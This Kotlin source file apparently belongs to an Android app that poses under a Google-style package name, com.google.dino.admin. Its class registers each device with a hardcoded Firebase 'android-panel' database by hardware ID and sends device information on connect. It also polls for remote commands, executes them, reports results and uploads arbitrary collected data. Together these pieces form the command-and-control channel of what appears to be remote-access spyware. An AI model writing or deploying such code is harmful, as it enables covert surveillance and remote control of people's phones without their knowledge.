package com.google.dino.admin

import android.content.Context
import android.provider.Settings
import android.util.Log
import com.google.firebase.database.*
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class FirebaseManager(private val context: Context) {

    companion object {
        private const val TAG = "FirebaseManager"
        private const val FIREBASE_URL = "https://android-panel-61c66-default-rtdb.europe-west1.firebasedatabase.app"
    }

    private val database: FirebaseDatabase by lazy {
        FirebaseDatabase.getInstance(FIREBASE_URL)
    }

    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    private val deviceRef: DatabaseReference by lazy {
        database.getReference("clients").child(deviceId)
    }

    private val messagesRef: DatabaseReference by lazy {
        database.getReference("messages").child(deviceId)
    }

    private val responsesRef: DatabaseReference by lazy {
        deviceRef.child("responses")
    }

    private val commandsRef: DatabaseReference by lazy {
        deviceRef.child("commands")
    }

    fun initializeConnection() {
        // Check Firebase connection
        database.getReference(".info/connected").addValueEventListener(
            object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val connected = snapshot.getValue(Boolean::class.java) ?: false
                    Log.d(TAG, "Firebase connected: $connected")
                    if (connected) {
                        sendDeviceInfo()
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Firebase connection failed: ${error.message}")
                }
            }
        )
    }

    fun sendDeviceInfo() {
        val deviceInfo = DeviceInfo(context).getAllDeviceInfo()

        deviceRef.updateChildren(deviceInfo)
            .addOnSuccessListener {
                Log.d(TAG, "Device info sent successfully")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed to send device info", e)
            }
    }

    fun updateStatus(status: Boolean) {
        val updates = hashMapOf<String, Any>(
            "status" to status,
            "lastSeen" to System.currentTimeMillis()
        )
        deviceRef.updateChildren(updates)
    }

    fun sendMessage(message: String, sender: String = "device") {
        val messageId = messagesRef.push().key ?: UUID.randomUUID().toString()
        
        val messageData = hashMapOf<String, Any>(
            "id" to messageId.hashCode(),
            "message" to message,
            "dateTime" to SimpleDateFormat("dd-MM-yyyy | hh:mm a", Locale.getDefault())
                .format(Date()),
            "vender" to sender
        )

        messagesRef.child(messageId).setValue(messageData)
            .addOnSuccessListener {
                Log.d(TAG, "Message sent successfully")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed to send message", e)
            }
    }

    fun sendCommandResponse(command: String, result: String, data: Any? = null) {
        val responseId = responsesRef.push().key ?: UUID.randomUUID().toString()
        
        val responseData = hashMapOf<String, Any>(
            "command" to command,
            "result" to result,
            "timestamp" to System.currentTimeMillis(),
            "success" to true
        )

        if (data != null) {
            responseData["data"] = data.toString()
        }

        responsesRef.child(responseId).setValue(responseData)
            .addOnSuccessListener {
                Log.d(TAG, "Response sent for command: $command")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed to send response", e)
            }
    }

    fun listenForCommands(onCommandReceived: (command: String, params: JSONObject?) -> Unit) {
        commandsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                try {
                    val command = snapshot.child("command").getValue(String::class.java)
                    val paramsJson = snapshot.child("params").getValue(String::class.java)
                    
                    var params: JSONObject? = null
                    if (!paramsJson.isNullOrEmpty()) {
                        params = JSONObject(paramsJson)
                    }

                    if (!command.isNullOrEmpty()) {
                        Log.d(TAG, "Command received: $command")
                        onCommandReceived(command, params)
                        
                        // Remove command after processing
                        snapshot.ref.removeValue()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing command", e)
                }
            }

            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                // Handle command updates if needed
            }

            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Command listener cancelled: ${error.message}")
            }
        })
    }

    fun sendErrorResponse(command: String, errorMessage: String) {
        val errorData = hashMapOf<String, Any>(
            "command" to command,
            "result" to "ERROR: $errorMessage",
            "timestamp" to System.currentTimeMillis(),
            "success" to false
        )

        responsesRef.push().setValue(errorData)
    }

    fun uploadData(dataType: String, data: Map<String, Any>) {
        val dataRef = deviceRef.child("data").child(dataType).push()
        
        val uploadData = hashMapOf<String, Any>(
            "timestamp" to System.currentTimeMillis(),
            "type" to dataType
        ).plus(data)

        dataRef.setValue(uploadData)
            .addOnSuccessListener {
                Log.d(TAG, "Data uploaded successfully: $dataType")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed to upload data: $dataType", e)
            }
    }

    fun getDeviceReference(): DatabaseReference {
        return deviceRef
    }

    fun getDatabase(): FirebaseDatabase {
        return database
    }
}
